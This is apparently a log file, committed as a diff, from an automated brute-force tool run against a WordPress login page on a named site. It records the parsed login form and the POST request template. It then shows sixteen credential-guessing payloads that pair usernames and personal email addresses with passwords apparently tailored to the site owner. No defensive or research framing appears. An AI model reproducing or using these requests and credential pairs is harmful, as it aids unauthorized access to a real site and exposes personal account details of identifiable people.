@@ -1,0 +1,92 @@
+INFO:root:random password generated: L?_|*Yq^fN
+INFO:root:username_element: log
+INFO:root:password_element: pwd
+INFO:root:random password generated: yy6.ur+'Cc
+INFO:root:username_element: log
+INFO:root:password_element: pwd
+INFO:root:{
+  "url": "https://alqlambara.com/wp-login.php",
+  "pass_user": "pass_user.csv",
+  "params_list": {
+    "password_param": [
+      "password"
+    ],
+    "user_param": [
+      "username",
+      "email",
+      "log",
+      "id"
+    ],
+    "ButtonList": [
+      "login",
+      "sign in"
+    ]
+  }
+}
+INFO:root:{
+  "button_attr": "input[type=submit][name=wp-submit][id=wp-submit][class=button\\ button-primary\\ button-large][value=Log\\ In]",
+  "form": "<form action=\"https://alqlambara.com/wp-login.php\" id=\"loginform\" method=\"post\" name=\"loginform\">\n<p>\n<label for=\"user_login\">Username or Email Address</label>\n<input autocapitalize=\"none\" class=\"input\" id=\"user_login\" name=\"log\" size=\"20\" type=\"text\" value=\"\"/>\n</p>\n<div class=\"user-pass-wrap\">\n<label for=\"user_pass\">Password</label>\n<div class=\"wp-pwd\">\n<input class=\"input password-input\" id=\"user_pass\" name=\"pwd\" size=\"20\" type=\"password\" value=\"\"/>\n<button aria-label=\"Show password\" class=\"button button-secondary wp-hide-pw hide-if-no-js\" data-toggle=\"0\" type=\"button\">\n<span aria-hidden=\"true\" class=\"dashicons dashicons-visibility\"></span>\n</button>\n</div>\n</div>\n<p class=\"forgetmenot\"><input id=\"rememberme\" name=\"rememberme\" type=\"checkbox\" value=\"forever\"/> <label for=\"rememberme\">Remember Me</label></p>\n<p class=\"submit\">\n<input class=\"button button-primary button-large\" id=\"wp-submit\" name=\"wp-submit\" type=\"submit\" value=\"Log In\"/>\n<input name=\"redirect_to\" type=\"hidden\" value=\"https://alqlambara.com/wp-admin/\"/>\n<input name=\"testcookie\" type=\"hidden\" value=\"1\"/>\n</p>\n</form>",
+  "user_param": "log",
+  "password_param": "pwd",
+  "contentLen": 4297.0,
+  "status_code": 200,
+  "post_data": {
+    "log": "test",
+    "pwd": "yy6.ur+'Cc",
+    "wp-submit": "Log In",
+    "redirect_to": "https://alqlambara.com/wp-admin/",
+    "testcookie": "1"
+  },
+  "method": "POST",
+  "action": "https://alqlambara.com/wp-login.php",
+  "headers": {
+    "host": "alqlambara.com",
+    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
+    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+    "accept-language": "en-US,en;q=0.5",
+    "accept-encoding": "gzip, deflate, br",
+    "referer": "https://alqlambara.com/wp-login.php",
+    "content-type": "application/x-www-form-urlencoded",
+    "origin": "https://alqlambara.com",
+    "alt-used": "alqlambara.com",
+    "connection": "keep-alive",
+    "upgrade-insecure-requests": "1",
+    "sec-fetch-dest": "document",
+    "sec-fetch-mode": "navigate",
+    "sec-fetch-site": "same-origin",
+    "sec-fetch-user": "?1"
+  },
+  "req_body_type": "URL_ENCODED"
+}
+INFO:root:[+ payload]: {'log': 'alqlambara@gmail.com', 'pwd': 'bara123405', 'wp-submit': 'Log In', 'redirect_to': 'https://alqlambara.com/wp-admin/', 'testcookie': '1'}
+INFO:root: max_similarity: 1.0
+INFO:root:[+ payload]: {'log': 'alqlambara@gmail.com', 'pwd': 'astmamsh123', 'wp-submit': 'Log In', 'redirect_to': 'https://alqlambara.com/wp-admin/', 'testcookie': '1'}
+INFO:root: max_similarity: 1.0
+INFO:root:[+ payload]: {'log': 'alqlambara@gmail.com', 'pwd': 'bara12340', 'wp-submit': 'Log In', 'redirect_to': 'https://alqlambara.com/wp-admin/', 'testcookie': '1'}
+INFO:root: max_similarity: 1.0
+INFO:root:[+ payload]: {'log': 'alqlambara@gmail.com', 'pwd': 'test', 'wp-submit': 'Log In', 'redirect_to': 'https://alqlambara.com/wp-admin/', 'testcookie': '1'}
+INFO:root: max_similarity: 1.0
+INFO:root:[+ payload]: {'log': 'test', 'pwd': 'bara123405', 'wp-submit': 'Log In', 'redirect_to': 'https://alqlambara.com/wp-admin/', 'testcookie': '1'}
+INFO:root: max_similarity: 1.0
+INFO:root:[+ payload]: {'log': 'test', 'pwd': 'astmamsh123', 'wp-submit': 'Log In', 'redirect_to': 'https://alqlambara.com/wp-admin/', 'testcookie': '1'}
+INFO:root: max_similarity: 1.0
+INFO:root:[+ payload]: {'log': 'test', 'pwd': 'bara12340', 'wp-submit': 'Log In', 'redirect_to': 'https://alqlambara.com/wp-admin/', 'testcookie': '1'}
+INFO:root: max_similarity: 1.0
+INFO:root:[+ payload]: {'log': 'test', 'pwd': 'test', 'wp-submit': 'Log In', 'redirect_to': 'https://alqlambara.com/wp-admin/', 'testcookie': '1'}
+INFO:root: max_similarity: 1.0
+INFO:root:[+ payload]: {'log': 'm7mdassi', 'pwd': 'bara123405', 'wp-submit': 'Log In', 'redirect_to': 'https://alqlambara.com/wp-admin/', 'testcookie': '1'}
+INFO:root: max_similarity: 1.0
+INFO:root:[+ payload]: {'log': 'm7mdassi', 'pwd': 'astmamsh123', 'wp-submit': 'Log In', 'redirect_to': 'https://alqlambara.com/wp-admin/', 'testcookie': '1'}
+INFO:root: max_similarity: 1.0
+INFO:root:[+ payload]: {'log': 'm7mdassi', 'pwd': 'bara12340', 'wp-submit': 'Log In', 'redirect_to': 'https://alqlambara.com/wp-admin/', 'testcookie': '1'}
+INFO:root: max_similarity: 1.0
+INFO:root:[+ payload]: {'log': 'm7mdassi', 'pwd': 'test', 'wp-submit': 'Log In', 'redirect_to': 'https://alqlambara.com/wp-admin/', 'testcookie': '1'}
+INFO:root: max_similarity: 1.0
+INFO:root:[+ payload]: {'log': 'mohamadassi173@gmail.com', 'pwd': 'bara123405', 'wp-submit': 'Log In', 'redirect_to': 'https://alqlambara.com/wp-admin/', 'testcookie': '1'}
+INFO:root: max_similarity: 1.0
+INFO:root:[+ payload]: {'log': 'mohamadassi173@gmail.com', 'pwd': 'astmamsh123', 'wp-submit': 'Log In', 'redirect_to': 'https://alqlambara.com/wp-admin/', 'testcookie': '1'}
+INFO:root: max_similarity: 1.0
+INFO:root:[+ payload]: {'log': 'mohamadassi173@gmail.com', 'pwd': 'bara12340', 'wp-submit': 'Log In', 'redirect_to': 'https://alqlambara.com/wp-admin/', 'testcookie': '1'}
+INFO:root: max_similarity: 1.0
+INFO:root:[+ payload]: {'log': 'mohamadassi173@gmail.com', 'pwd': 'test', 'wp-submit': 'Log In', 'redirect_to': 'https://alqlambara.com/wp-admin/', 'testcookie': '1'}
+INFO:root: max_similarity: 1.0
